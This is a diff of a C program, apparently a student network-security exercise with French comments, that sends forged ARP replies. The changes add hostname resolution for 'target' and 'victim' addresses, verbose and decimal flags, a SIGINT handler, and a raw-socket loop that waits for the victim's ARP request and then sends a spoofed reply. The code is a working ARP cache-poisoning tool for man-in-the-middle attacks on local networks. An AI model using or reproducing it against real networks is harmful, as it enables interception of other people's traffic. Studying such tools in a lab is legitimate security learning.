@@ -26,6 +26,13 @@
 
 ◦ printf and its family - printers
 */
+volatile sig_atomic_t stop = 0;
+
+void handle_sigint(int sig)
+{
+    (void)sig;
+    stop = 1;
+};
 
 int hex_check(char c)
 {
@@ -56,9 +63,9 @@ int reply_prep(ether_hdr **fake_header, char **av)
     ether_hdr *r = malloc(sizeof(*r));
     if(!r)
         return 2;
-    if (mac_to_byte(av[2], r->dest_addr) != 0)
+    if (mac_to_byte(av[4], r->dest_addr) != 0)
         return (free(r),1);
-    if (mac_to_byte(av[4], r->src_addr) != 0)
+    if (mac_to_byte(av[2], r->src_addr) != 0)
         return (free(r),1);
     r->frame_type = htons(ETH_P_ARP);
     *fake_header = r;
@@ -173,6 +180,7 @@ printf("Ethernet Header:\n");
     printf("Src addr   : %02x:%02x:%02x:%02x:%02x:%02x\n",
            fake_header->src_addr[0], fake_header->src_addr[1], fake_header->src_addr[2],
            fake_header->src_addr[3], fake_header->src_addr[4], fake_header->src_addr[5]);
+    printf("Frame type : 0x%04x\n", ntohs(fake_header->frame_type));
     printf("\nARP Packet:\n");
     printf("htype : %u\n", ntohs(arp->htype));
     printf("ptype : 0x%04x\n", ntohs(arp->ptype));
@@ -195,13 +203,57 @@ printf("Ethernet Header:\n");
     printf("TPA   : %s\n", inet_ntoa(tpa_addr));
 }
 
+int resolve_ip(const char *name_or_ip, uint32_t *out_nbo)
+{
+    struct addrinfo hints;
+    struct addrinfo *res = NULL;
+    int rc;
+    // char ipstr[INET_ADDRSTRLEN];
 
+    if (!name_or_ip || !out_nbo)
+        return -1;
+
+    ft_memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_INET;        /* force IPv4 */
+    hints.ai_socktype = 0;            /* pas de contrainte */
+
+    rc = getaddrinfo(name_or_ip, NULL, &hints, &res);
+    if (rc != 0) {
+        /* getaddrinfo ne trouve pas -> échoue */
+        return -1;
+    }
+
+    /* prend la première adresse IPv4 renvoyée */
+    struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
+    *out_nbo = sin->sin_addr.s_addr; /* déjà en network byte order */
+
+    /* (optionnel) debug : afficher l'IP résolue
+       inet_ntop(AF_INET, &sin->sin_addr, ipstr, sizeof(ipstr));
+       printf("%s -> %s\n", name_or_ip, ipstr);
+    */
+
+    freeaddrinfo(res);
+    return 0;
+}
 int main(int ac, char **av) 
 {
-    if(ac != 5)
+    if(ac != 5 && ac != 6)
     {
         fprintf(stderr, "Args needed\n");
         return 1;
+    }
+    int  flag = 0;
+    if(ac == 6)
+    {
+        if(ft_memcmp(av[5], "-v", 3) == 0)
+            flag = 1;
+        else if(ft_memcmp(av[5], "-d", 3) == 0)
+            flag = 2;
+        else
+        {
+            fprintf(stderr, "Last arg must be -v for verbose or -d for decimal notation of IP addresses\n");
+            return 1;
+        }
     }
     if(getuid() != 0)
     {
@@ -217,12 +269,49 @@ int main(int ac, char **av)
     }
     arp_ether_ipv4 *arp = malloc(sizeof(*arp));
     ft_memset(arp, 0, sizeof(arp_ether_ipv4));
-    if(inet_pton(AF_INET, av[1], &arp->tpa) != 1 || inet_pton(AF_INET, av[3], &arp->spa) != 1)
+    // if(inet_pton(AF_INET, av[1], &arp->tpa) != 1 || inet_pton(AF_INET, av[3], &arp->spa) != 1)
+    // {
+    //     error_printer(1);
+    //     free(fake_header);
+    //     free(arp);
+    //     return 1;
+    // }
+    u_int32_t tmp_ip;
+    if(flag != 2)
     {
-        error_printer(1);
-        free(fake_header);
-        free(arp);
-        return 1;
+        if (resolve_ip(av[3], &tmp_ip) != 0) {
+            fprintf(stderr, "Unable to resolve target '%s'\n", av[1]);
+            free(fake_header);
+            free(arp);
+            return 1;
+        }
+        ft_memcpy(&arp->tpa, &tmp_ip, sizeof(tmp_ip));
+        if(flag == 1)
+            printf("Target IP resolved: %s\n", inet_ntoa(*(struct in_addr *)&tmp_ip));
+        /* résout av[3] -> spa (IP de la victime) */
+        if (resolve_ip(av[1], &tmp_ip) != 0) {
+            fprintf(stderr, "Unable to resolve victim '%s'\n", av[3]);
+            free(fake_header);
+            free(arp);
+            return 1;
+        }
+        ft_memcpy(&arp->spa, &tmp_ip, sizeof(tmp_ip));
+        if(flag == 1)
+            printf("Victim IP resolved: %s\n", inet_ntoa(*(struct in_addr *)&tmp_ip));
+    }
+    else
+    {
+        // decimal notation
+        uint32_t ip_decimal = 0x0A000205; // 10.0.2.5
+        struct in_addr ip_addr;
+        char buf[INET_ADDRSTRLEN];
+
+        ip_addr.s_addr = htonl(ip_decimal);
+        if (inet_ntop(AF_INET, &ip_addr, buf, sizeof(buf)) != NULL) {
+            printf("IP: %s\n", buf);
+        }
+        return 0;
+
     }
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (sock < 0) 
@@ -247,23 +336,34 @@ int main(int ac, char **av)
     size_t total = eth_len + arp_len;
     uint8_t packet[1500]; // assez grand pour une trame Ethernet
 
-    // copier l'en-tête ethernet
+    //en-tête ethernet
     ft_memcpy(packet, fake_header, eth_len);
 
-    // copier la trame ARP
+    //trame ARP
     ft_memcpy(packet + eth_len, arp, arp_len);
-    // ◦ sigaction - examine and change signal action
-    // ◦ signal - set a signal handler
-    while(1)
+
+    struct sigaction sa;
+    ft_memset(&sa, 0, sizeof(sa));
+    sa.sa_handler = handle_sigint;
+    if (sigaction(SIGINT, &sa, NULL) == -1) {
+        fprintf(stderr, "sigaction");
+        free(fake_header);
+        free(arp);
+        close(sock);
+        return 1;
+    }
+
+    int ret = 0;
+    while(!stop)
     {
-        recvfrom(sock, buf1, sizeof(buf1), 0, NULL, NULL);
+        ret = recvfrom(sock, buf1, sizeof(buf1), 0, NULL, NULL);
         if(ft_memcmp(&recv_arp->tpa, &arp->spa, sizeof(struct in_addr)) == 0)
             break;
     }
 
 
     // envoyer la trame complète
-    if(1)
+    if(ret != -1)
     {
         ssize_t sent = sendto(sock, packet, total, 0,
                             (struct sockaddr *)&addr, (socklen_t)sizeof(addr));
@@ -271,7 +371,8 @@ int main(int ac, char **av)
             fprintf(stderr, "No send\n");
         else
             printf("Sent %zd bytes\n", sent);
-        print_arp_packet("Sent ARP reply", arp, fake_header);
+        if(flag == 1)
+            print_arp_packet("Sent ARP reply", arp, fake_header);
     }
     free(fake_header);
     free(arp);
